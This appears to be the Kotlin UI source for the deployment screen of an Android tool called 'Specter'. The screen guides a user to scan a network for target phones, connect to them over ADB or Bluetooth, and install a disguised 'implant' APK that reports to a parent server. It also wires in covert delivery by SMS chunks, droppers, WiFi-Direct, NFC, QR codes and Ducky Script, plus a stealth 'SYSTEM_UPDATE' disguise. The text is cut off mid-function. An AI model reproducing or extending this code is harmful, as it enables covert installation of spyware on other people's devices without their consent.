package com.divine.specter.ui

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import android.app.Activity
import androidx.compose.ui.Alignment
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Shadow
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.divine.specter.SpecterApplication
import com.divine.specter.adb.AdbManager
import com.divine.specter.deploy.DeploymentManager
import com.divine.specter.stealth.StealthManager
import com.divine.specter.network.NetworkScanner
import com.divine.specter.ui.theme.Cyber
import com.divine.specter.ui.components.DeliveryMethodsCard
import com.divine.specter.ui.components.DuckyScriptCard
import com.divine.specter.ui.components.NfcDeploymentCard
import com.divine.specter.ui.components.QrCodeDeploymentCard
import com.divine.specter.ui.components.WifiDirectCard
import com.divine.specter.ui.components.WifiScannerCard
import com.divine.specter.ui.components.BluetoothScannerCard
import com.divine.specter.ui.components.BleScannerCard
import com.divine.specter.ui.components.MdnsScannerCard
import com.divine.specter.ui.components.UpnpScannerCard
import com.divine.specter.delivery.WifiDirectTransfer
import kotlinx.coroutines.launch
import java.io.File

enum class DeliveryMethod {
    ADB, BLUETOOTH
}

@Composable
fun DeployScreen() {
    val context = LocalContext.current
    val activity = context as? Activity
    val app = SpecterApplication.instance
    val adbManager = app.adbManager
    val stealthManager = app.stealthManager
    val deploymentManager = remember { DeploymentManager(app, adbManager) }
    val bluetoothTransfer = remember { com.divine.specter.delivery.BluetoothTransfer() }
    val smsApkSender = remember { com.divine.specter.delivery.SmsApkSender(app.applicationContext) }
    val dropperGenerator = remember { com.divine.specter.delivery.DropperGenerator(app.applicationContext) }
    val wifiDirectTransfer = remember { WifiDirectTransfer(app.applicationContext) }
    val scope = rememberCoroutineScope()

    // Initialize WiFi-Direct
    LaunchedEffect(Unit) {
        wifiDirectTransfer.initialize()
    }

    // Cleanup WiFi-Direct on dispose
    DisposableEffect(Unit) {
        onDispose {
            wifiDirectTransfer.cleanup()
        }
    }

    // Stealth configuration (for child app)
    val currentDisguiseMode by stealthManager.currentMode.collectAsState(initial = StealthManager.DisguiseMode.SYSTEM_UPDATE)
    val activationCode by stealthManager.activationCode.collectAsState(initial = StealthManager.DEFAULT_ACTIVATION_CODE)
    var showCodeDialog by remember { mutableStateOf(false) }
    var stealthExpanded by remember { mutableStateOf(false) }

    // Delivery method selection
    var deliveryMethod by remember { mutableStateOf(DeliveryMethod.ADB) }

    val connectionState by adbManager.connectionState.collectAsState()
    val deployState by deploymentManager.deployState.collectAsState()
    val childInstalled by deploymentManager.childInstalled.collectAsState()

    // Enhanced network scanner with device fingerprinting
    val networkScanner = app.networkScanner

    var targetHost by remember { mutableStateOf("") }
    var targetPort by remember { mutableStateOf("5555") }
    var selectedBluetoothMac by remember { mutableStateOf<String?>(null) }
    var deviceName by remember { mutableStateOf("Child_Device") }
    var altDeliveryServerUrl by remember { mutableStateOf("") }
    var childInfo by remember { mutableStateOf<DeploymentManager.ChildAppInfo?>(null) }
    var showUninstallDialog by remember { mutableStateOf(false) }

    // Bluetooth state
    var bluetoothDevices by remember { mutableStateOf<List<Pair<String, String>>>(emptyList()) }
    var selectedBluetoothDevice by remember { mutableStateOf<Pair<String, String>?>(null) }
    var bluetoothProgress by remember { mutableStateOf<String?>(null) }
    var bluetoothError by remember { mutableStateOf<String?>(null) }

    // Pending delivery actions (for permission callbacks)
    var pendingSmsPhone by remember { mutableStateOf<String?>(null) }
    var pendingBluetoothAddress by remember { mutableStateOf<String?>(null) }
    var pendingBluetoothRefresh by remember { mutableStateOf(false) }

    // Helper function to extract APK to cache
    suspend fun extractApkToCache(): Boolean {
        return try {
            val context = app.applicationContext
            val apkFile = File(context.cacheDir, "specter-child.apk")
            val inputStream = context.assets.open("specter-child.apk")
            val outputStream = apkFile.outputStream()
            inputStream.copyTo(outputStream)
            inputStream.close()
            outputStream.close()
            true
        } catch (e: Exception) {
            false
        }
    }

    // Permission launchers
    val smsPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted && pendingSmsPhone != null) {
            // SMS permission granted - trigger the actual send
            val phone = pendingSmsPhone!!
            pendingSmsPhone = null
            val apkFile = File(app.applicationContext.cacheDir, "specter-child.apk")
            smsApkSender.setListener(object : com.divine.specter.delivery.SmsApkSender.SendListener {
                override fun onProgress(chunksSent: Int, totalChunks: Int, percentage: Float) {
                    bluetoothProgress = "SMS: $chunksSent/$totalChunks (${percentage.toInt()}%)"
                    bluetoothError = null
                }
                override fun onComplete(totalSent: Int) {
                    bluetoothProgress = "✓ SMS complete: $totalSent messages sent"
                    bluetoothError = null
                }
                override fun onFailed(error: String, chunksFailed: Int) {
                    bluetoothProgress = null
                    bluetoothError = "SMS failed: $error"
                }
            })
            scope.launch {
                if (!extractApkToCache()) {
                    bluetoothError = "Failed to extract APK"
                    return@launch
                }
                smsApkSender.sendApk(apkFile, phone)
            }
        } else if (!isGranted) {
            bluetoothError = "SMS permission denied"
            pendingSmsPhone = null
        }
    }

    val bluetoothPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted && pendingBluetoothRefresh) {
            pendingBluetoothRefresh = false
            bluetoothDevices = bluetoothTransfer.getPairedDevices()
        } else if (isGranted && pendingBluetoothAddress != null) {
            // Bluetooth permission granted - trigger the actual transfer
            val address = pendingBluetoothAddress!!
            pendingBluetoothAddress = null
            val apkFile = File(app.applicationContext.cacheDir, "specter-child.apk")
            bluetoothTransfer.setTransferListener(object : com.divine.specter.delivery.BluetoothTransfer.TransferListener {
                override fun onConnecting(deviceName: String) {
                    bluetoothProgress = "Connecting to $deviceName..."
                    bluetoothError = null
                }
                override fun onConnected(deviceName: String) {
                    bluetoothProgress = "Connected. Sending APK..."
                }
                override fun onProgress(bytesSent: Long, totalBytes: Long, percentage: Float) {
                    bluetoothProgress = "Sending: ${percentage.toInt()}%"
                }
                override fun onComplete(bytesSent: Long) {
                    bluetoothProgress = "✓ Transfer complete ($bytesSent bytes)"
                    bluetoothError = null
                }
                override fun onFailed(error: String) {
                    bluetoothProgress = null
                    bluetoothError = "Transfer failed: $error"
                }
            })
            scope.launch {
                if (!extractApkToCache()) {
                    bluetoothError = "Failed to extract APK"
                    return@launch
                }
                bluetoothTransfer.sendApk(apkFile, address)
            }
        } else if (!isGranted) {
            bluetoothError = "Bluetooth permission denied"
            pendingBluetoothAddress = null
        }
    }

    // WiFi-Direct permission launcher (multiple permissions)
    var wifiDirectPermissionsRequested by remember { mutableStateOf(false) }
    val wifiDirectPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            wifiDirectTransfer.initialize()
        }
        wifiDirectPermissionsRequested = true
    }

    // Function to request WiFi-Direct permissions
    fun requestWifiDirectPermissions() {
        val permissionsToRequest = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.NEARBY_WIFI_DEVICES)
        }
        wifiDirectPermissionLauncher.launch(permissionsToRequest.toTypedArray())
    }

    // Parent server state
    val parentServer = app.parentServer
    val isParentRunning by parentServer.isRunning.collectAsState()
    val parentServerUrl by parentServer.serverUrl.collectAsState()

    val isConnected = connectionState is AdbManager.ConnectionState.Connected
    val apkAvailable = remember { deploymentManager.checkApkAvailable() }
    val apkSize = remember { deploymentManager.getApkSize() }

    LaunchedEffect(isConnected) {
        if (isConnected) {
            deploymentManager.checkChildInstalled()
            childInfo = deploymentManager.getInstalledChildInfo()
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Cyber.Black)
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // Header
        CyberSectionHeader(title = "// PAYLOAD_DEPLOY", color = Cyber.Cyan)

        // Workflow overview
        CyberCard(borderColor = Cyber.Cyan) {
            Column(modifier = Modifier.padding(12.dp)) {
                Text(
                    "DEPLOYMENT_WORKFLOW",
                    style = TextStyle(
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace,
                        color = Cyber.Cyan
                    )
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    buildString {
                        appendLine("1. Verify payload APK is available")
                        appendLine("2. Start parent server (port 8855)")
                        appendLine("3. Scan network for target devices")
                        appendLine("4. Connect to target via ADB")
                        appendLine("5. Deploy implant")
                        appendLine("")
                        append("Or scroll down for: SMS, Bluetooth, Dropper, WiFi-Direct, NFC, QR Code, Ducky Script")
                    },
                    style = TextStyle(
                        fontSize = 10.sp,
                        fontFamily = FontFamily.Monospace,
                        color = Cyber.TextSecondary,
                        lineHeight = 14.sp
                    )
                )
            }
        }

        // STEP 1: Verify Payload
        Text(
            "STEP 1: VERIFY PAYLOAD",
            style = TextStyle(
                fontSize = 13.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                color = Cyber.Magenta
            )
        )

        CyberCard(
            borderColor = if (apkAvailable) Cyber.Lime else Cyber.Red
        ) {
            Row(
                modifier = Modifier.padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Icon(
                    if (apkAvailable) Icons.Default.Android else Icons.Default.Warning,
                    contentDescription = null,
                    tint = if (apkAvailable) Cyber.Lime else Cyber.Red,
                    modifier = Modifier.size(40.dp)
                )
                Column {
                    Text(
                        if (apkAvailable) "✓ PAYLOAD_READY" else "✗ PAYLOAD_MISSING",
                        style = TextStyle(
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold,
                            fontFamily = FontFamily.Monospace,
                            color = if (apkAvailable) Cyber.Lime else Cyber.Red
                        )
                    )
                    Text(
                        if (apkAvailable)
                            "specter-child.apk (${formatSize(apkSize)})"
                        else
                            "Add specter-child.apk to assets folder",
                        style = TextStyle(
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            color = Cyber.TextSecondary
                        )
                    )
                }
            }
        }

        // STEP 2: Start Parent Server
        Text(
            "STEP 2: START PARENT SERVER",
            style = TextStyle(
                fontSize = 13.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                color = Cyber.Magenta
            )
        )

        // Server control (Step 2 in deployment flow)
        CyberCard(borderColor = if (isParentRunning) Cyber.Lime else Cyber.Orange) {
            Row(
                modifier = Modifier
                    .padding(12.dp)
                    .fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Icon(
                        if (isParentRunning) Icons.Default.Cloud else Icons.Default.CloudOff,
                        contentDescription = null,
                        tint = if (isParentRunning) Cyber.Lime else Cyber.Orange,
                        modifier = Modifier.size(20.dp)
                    )
                    Column {
                        Text(
                            if (isParentRunning) "SERVER_ONLINE" else "SERVER_OFFLINE",
                            style = TextStyle(
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = if (isParentRunning) Cyber.Lime else Cyber.Orange
                            )
                        )
                        Text(
                            if (isParentRunning) parentServerUrl ?: "Port 8855" else "Required for child sync",
                            style = TextStyle(
                                fontSize = 9.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextMuted
                            )
                        )
                    }
                }
                // Compact toggle button
                Surface(
                    onClick = { if (isParentRunning) parentServer.stop() else parentServer.start() },
                    shape = RoundedCornerShape(4.dp),
                    color = if (isParentRunning) Cyber.Red.copy(alpha = 0.2f) else Cyber.Lime.copy(alpha = 0.2f),
                    border = BorderStroke(1.dp, if (isParentRunning) Cyber.Red else Cyber.Lime)
                ) {
                    Text(
                        if (isParentRunning) "STOP" else "START",
                        style = TextStyle(
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            fontFamily = FontFamily.Monospace,
                            color = if (isParentRunning) Cyber.Red else Cyber.Lime
                        ),
                        modifier = Modifier.padding(horizontal = 12.dp, vertical = 6.dp)
                    )
                }
            }
        }

        // Check if connected to localhost (self-connection for permissions, not a target)
        val isLocalhostConnection = (connectionState as? AdbManager.ConnectionState.Connected)?.let { state ->
            state.host == "localhost" || state.host == "127.0.0.1" || state.host.startsWith("127.")
        } ?: false

        // STEP 3: Connect to Target Device (only show for remote targets)
        Text(
            "STEP 3: CONNECT TO TARGET",
            style = TextStyle(
                fontSize = 13.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                color = Cyber.Magenta
            )
        )

        // Target Connection - ADB or Bluetooth
        if (deliveryMethod == DeliveryMethod.ADB) {
            // ADB Connection Card
            CyberCard(
                borderColor = when {
                    isLocalhostConnection -> Cyber.Cyan // Local permissions active
                    connectionState is AdbManager.ConnectionState.Connected -> Cyber.Lime
                    connectionState is AdbManager.ConnectionState.Connecting -> Cyber.Orange
                    else -> Cyber.Red
                }
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            when {
                                isLocalhostConnection -> Icons.Default.Security
                                connectionState is AdbManager.ConnectionState.Connected -> Icons.Default.PhoneAndroid
                                connectionState is AdbManager.ConnectionState.Connecting -> Icons.Default.Sync
                                else -> Icons.Default.PhonelinkOff
                            },
                            contentDescription = null,
                            tint = Cyber.Cyan
                        )
                        Text(
                            if (isLocalhostConnection) "LOCAL_ADB_ACTIVE" else "TARGET_DEVICE (ADB)",
                            style = TextStyle(
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Cyan
                            )
                        )
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    when (val state = connectionState) {
                        is AdbManager.ConnectionState.Connected -> {
                            if (isLocalhostConnection) {
                                // Local connection - for elevated permissions
                                Text(
                                    "✓ Elevated permissions active",
                                    style = TextStyle(
                                        fontSize = 11.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.Cyan
                                    )
                                )
                                Spacer(modifier = Modifier.height(8.dp))
                                // Show scanner even for localhost - user needs to find targets
                                CyberDeviceScanner(
                                    targetHost = targetHost,
                                    targetPort = targetPort,
                                    onHostChange = { targetHost = it },
                                    onPortChange = { targetPort = it },
                                    onScan = {
                                        android.util.Log.d("DeployScreen", "SCAN button clicked!")
                                        networkScanner.startScan()
                                    },
                                    onConnect = { ip, port ->
                                        targetHost = ip
                                        targetPort = port.toString()
                                        adbManager.connect(ip, port)
                                    },
                                    onSelectMacForBluetooth = { mac -> selectedBluetoothMac = mac }
                                )
                            } else {
                                // Remote connection - actual target
                                Text(
                                    "LINKED: ${state.device}",
                                    style = TextStyle(
                                        fontSize = 12.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.Lime
                                    )
                                )
                                Spacer(modifier = Modifier.height(8.dp))
                                CyberButton(
                                    text = "DISCONNECT",
                                    color = Cyber.Red,
                                    onClick = { adbManager.disconnect() }
                                )
                            }
                        }
                        is AdbManager.ConnectionState.Connecting -> {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                CircularProgressIndicator(
                                    modifier = Modifier.size(16.dp),
                                    color = Cyber.Orange,
                                    strokeWidth = 2.dp
                                )
                                Text(
                                    "ESTABLISHING_LINK...",
                                    style = TextStyle(
                                        fontSize = 12.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.Orange
                                    )
                                )
                            }
                        }
                        is AdbManager.ConnectionState.Error -> {
                            Text(
                                "ERROR: ${state.message}",
                                style = TextStyle(
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Red
                                )
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            CyberDeviceScanner(
                                targetHost = targetHost,
                                targetPort = targetPort,
                                onHostChange = { targetHost = it },
                                onPortChange = { targetPort = it },
                                onScan = {
                                    android.util.Log.d("DeployScreen", "SCAN button clicked!")
                                    networkScanner.startScan()
                                },
                                onConnect = { ip, port ->
                                    targetHost = ip
                                    targetPort = port.toString()
                                    adbManager.connect(ip, port)
                                },
                                onSelectMacForBluetooth = { mac -> selectedBluetoothMac = mac }
                            )
                        }
                        AdbManager.ConnectionState.Disconnected -> {
                            CyberDeviceScanner(
                                targetHost = targetHost,
                                targetPort = targetPort,
                                onHostChange = { targetHost = it },
                                onPortChange = { targetPort = it },
                                onScan = {
                                    android.util.Log.d("DeployScreen", "SCAN button clicked!")
                                    networkScanner.startScan()
                                },
                                onConnect = { ip, port ->
                                    targetHost = ip
                                    targetPort = port.toString()
                                    adbManager.connect(ip, port)
                                },
                                onSelectMacForBluetooth = { mac -> selectedBluetoothMac = mac }
                            )
                        }
                    }
                }
            }
        } else {
            // Bluetooth Connection Card
            CyberCard(
                borderColor = if (selectedBluetoothDevice != null) Cyber.Lime else Cyber.Magenta
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            Icons.Default.Bluetooth,
                            contentDescription = null,
                            tint = Cyber.Magenta
                        )
                        Text(
                            "TARGET_DEVICE (BLUETOOTH)",
                            style = TextStyle(
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Magenta
                            )
                        )
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    if (!bluetoothTransfer.isBluetoothAvailable()) {
                        Text(
                            "Bluetooth not available or disabled",
                            style = TextStyle(
                                fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Red
                            )
                        )
                    } else if (bluetoothDevices.isEmpty()) {
                        Text(
                            "No paired devices found",
                            style = TextStyle(
                                fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Orange
                            )
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        CyberButton(
                            text = "REFRESH",
                            color = Cyber.Magenta,
                            onClick = {
                                val btPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                                    Manifest.permission.BLUETOOTH_CONNECT
                                else Manifest.permission.BLUETOOTH
                                if (ContextCompat.checkSelfPermission(app.applicationContext, btPerm) == PackageManager.PERMISSION_GRANTED) {
                                    bluetoothDevices = bluetoothTransfer.getPairedDevices()
                                } else {
                                    pendingBluetoothRefresh = true
                                    bluetoothPermissionLauncher.launch(btPerm)
                                }
                            }
                        )
                    } else {
                        if (selectedBluetoothDevice != null) {
                            Text(
                                "SELECTED: ${selectedBluetoothDevice!!.second}",
                                style = TextStyle(
                                    fontSize = 12.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Lime
                                )
                            )
                            Text(
                                selectedBluetoothDevice!!.first,
                                style = TextStyle(
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.TextSecondary
                                )
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            CyberButton(
                                text = "CLEAR_SELECTION",
                                color = Cyber.Red,
                                outlined = true,
                                onClick = { selectedBluetoothDevice = null }
                            )
                        } else {
                            Text(
                                "PAIRED DEVICES:",
                                style = TextStyle(
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.TextMuted
                                )
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            bluetoothDevices.forEach { (address, name) ->
                                Surface(
                                    onClick = { selectedBluetoothDevice = Pair(address, name) },
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(6.dp),
                                    color = Cyber.Magenta.copy(alpha = 0.1f),
                                    border = ButtonDefaults.outlinedButtonBorder.copy(
                                        brush = Brush.horizontalGradient(
                                            listOf(Cyber.Magenta.copy(0.5f), Cyber.Magenta.copy(0.2f))
                                        )
                                    )
                                ) {
                                    Row(
                                        modifier = Modifier.padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                                    ) {
                                        Icon(
                                            Icons.Default.Bluetooth,
                                            contentDescription = null,
                                            tint = Cyber.Magenta
                                        )
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                name,
                                                style = TextStyle(
                                                    fontSize = 12.sp,
                                                    fontWeight = FontWeight.Bold,
                                                    fontFamily = FontFamily.Monospace,
                                                    color = Cyber.TextPrimary
                                                )
                                            )
                                            Text(
                                                address,
                                                style = TextStyle(
                                                    fontSize = 10.sp,
                                                    fontFamily = FontFamily.Monospace,
                                                    color = Cyber.TextSecondary
                                                )
                                            )
                                        }
                                    }
                                }
                                Spacer(modifier = Modifier.height(4.dp))
                            }
                        }
                    }

                    // Bluetooth transfer progress
                    if (bluetoothProgress != null) {
                        Spacer(modifier = Modifier.height(12.dp))
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(16.dp),
                                color = Cyber.Magenta,
                                strokeWidth = 2.dp
                            )
                            Text(
                                bluetoothProgress!!,
                                style = TextStyle(
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Magenta
                                )
                            )
                        }
                    }

                    // Bluetooth error
                    if (bluetoothError != null) {
                        Spacer(modifier = Modifier.height(12.dp))
                        Text(
                            "✗ $bluetoothError",
                            style = TextStyle(
                                fontSize = 11.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Red
                            )
                        )
                    }
                }
            }
        }

        // STEP 4: Enter Device Name
        Text(
            "STEP 4: ENTER DEVICE NAME",
            style = TextStyle(
                fontSize = 13.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                color = Cyber.Magenta
            )
        )

        // Device Name Input
        if (isConnected) {
            CyberCard(borderColor = Cyber.Cyan) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "CHILD_IDENTITY",
                        style = TextStyle(
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            color = Cyber.TextMuted
                        )
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = deviceName,
                        onValueChange = { deviceName = it },
                        label = { Text("DEVICE_NAME", color = Cyber.TextMuted) },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Cyber.Cyan,
                            unfocusedBorderColor = Cyber.MediumGray,
                            focusedTextColor = Cyber.TextPrimary,
                            unfocusedTextColor = Cyber.TextSecondary
                        )
                    )
                }
            }
        } else {
            Text(
                "→ Connect a device in Step 3 to unlock",
                style = TextStyle(
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Cyber.Cyan.copy(alpha = 0.4f)
                ),
                modifier = Modifier.padding(vertical = 4.dp)
            )
        }

        // Child App Status
        if (isConnected) {
            CyberCard(
                borderColor = if (childInstalled) Cyber.Lime else Cyber.Magenta
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            if (childInstalled) Icons.Default.CheckCircle else Icons.Default.Cancel,
                            contentDescription = null,
                            tint = if (childInstalled) Cyber.Lime else Cyber.Magenta
                        )
                        Text(
                            "IMPLANT_STATUS",
                            style = TextStyle(
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.Magenta
                            )
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    if (childInstalled && childInfo != null) {
                        Text("PKG: ${childInfo!!.packageName}", style = cyberBodyStyle())
                        Text("VER: ${childInfo!!.versionName} (${childInfo!!.versionCode})", style = cyberBodyStyle())
                        if (childInfo!!.firstInstall.isNotBlank()) {
                            Text("DEPLOYED: ${childInfo!!.firstInstall}", style = cyberBodyStyle())
                        }
                    } else {
                        Text(
                            "NO_IMPLANT_DETECTED",
                            style = TextStyle(
                                fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace,
                                color = Cyber.TextSecondary
                            )
                        )
                    }
                }
            }
        }

        // STEP 5: Deploy Child App
        Text(
            "STEP 5: DEPLOY CHILD APP",
            style = TextStyle(
                fontSize = 13.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace,
                color = Cyber.Magenta
            )
        )

        // Deploy Actions
        val canDeployAdb = deliveryMethod == DeliveryMethod.ADB && isConnected && apkAvailable
        val canDeployBluetooth = deliveryMethod == DeliveryMethod.BLUETOOTH && selectedBluetoothDevice != null && apkAvailable

        if (!(canDeployAdb || canDeployBluetooth)) {
            Text(
                "→ Complete Steps 3–4 to deploy",
                style = TextStyle(
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    color = Cyber.Cyan.copy(alpha = 0.4f)
                ),
                modifier = Modifier.padding(vertical = 4.dp)
            )
        }

        if (canDeployAdb || canDeployBluetooth) {
            CyberCard(borderColor = if (deliveryMethod == DeliveryMethod.ADB) Cyber.Cyan else Cyber.Magenta) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "// DEPLOY_ACTIONS",
                        style = TextStyle(
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace,
                            color = Cyber.TextMuted
                        )
                    )
                    Spacer(modifier = Modifier.height(12.dp))

                    if (deliveryMethod == DeliveryMethod.ADB) {
                        // ADB Deploy State
                        when (val state = deployState) {
                            is DeploymentManager.DeployState.Deploying -> {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(16.dp),
                                        color = Cyber.Cyan,
                                        strokeWidth = 2.dp
                                    )
                                    Text(state.progress, style = cyberBodyStyle())
                                }
                                Spacer(modifier = Modifier.height(12.dp))
                            }
                            is DeploymentManager.DeployState.Success -> {
                                Text(
                                    "✓ ${state.message}",
                                    style = TextStyle(
                                        fontSize = 12.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.Lime
                                    )
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                            }
                            is DeploymentManager.DeployState.Error -> {
                                Text(
                                    "✗ ${state.message}",
                                    style = TextStyle(
                                        fontSize = 12.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = Cyber.Red
                                    )
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                            }
                            else -> {}
                        }

                        CyberButton(
                            text = if (childInstalled) "UPDATE_IMPLANT" else "DEPLOY_IMPLANT (ADB)",
                            color = Cyber.Cyan,
                            enabled = deployState !is DeploymentManager.DeployState.Deploying &&
                                      isParentRunning &&
                                      deviceName.isNotBlank(),
                            onClick = {
                                scope.launch {
                                    // Get parent server IP and port from running server
                                    val parentIp = parentServerUrl
                                        ?.removePrefix("http://")
                                        ?.substringBefore(":")
                                        ?: getLocalIpAddress()
                                    val parentPort = parentServerUrl
                                        ?.substringAfterLast(":")
                                        ?.toIntOrNull()
                                        ?: 8855

                                    deploymentManager.deployAndConfigure(parentIp, parentPort, deviceName)
                                    deploymentManager.checkChildInstalled()
                                    childInfo = deploymentManager.getInstalledChildInfo()
                                }
                            }
                        )

                        if (!isParentRunning) {
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                "⚠ Start parent server first",
                                style = TextStyle(
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Cyber.Orange
                                )
                            )
                        }

                        if (childInstalled) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                CyberButton(
                                    text = "SETTINGS",
                                    color = Cyber.ElectricBlue,
                                    outlined = true,
                                    modifier = Modifier.weight(1f),
                                    onClick = {
                                        scope.launch { deploymentManager.launchChildSettings() }
                                    }
                                )
                                CyberButton(
                                    text = "REMOVE",
                                    color = Cyber.Red,
                                    outlined = true,
                                    modifier = Modifier.weight(1f),
                                    onClick = { showUninstallDialog = true }
                                )
                            }
                        }
                    } else {
                        // Bluetooth Deploy
                        CyberButton(
                            text = "SEND_APK (BLUETOOTH)",
                            color = Cyber.Magenta,
                            enabled = selectedBluetoothDevice != null && bluetoothProgress == null,
                            onClick = {
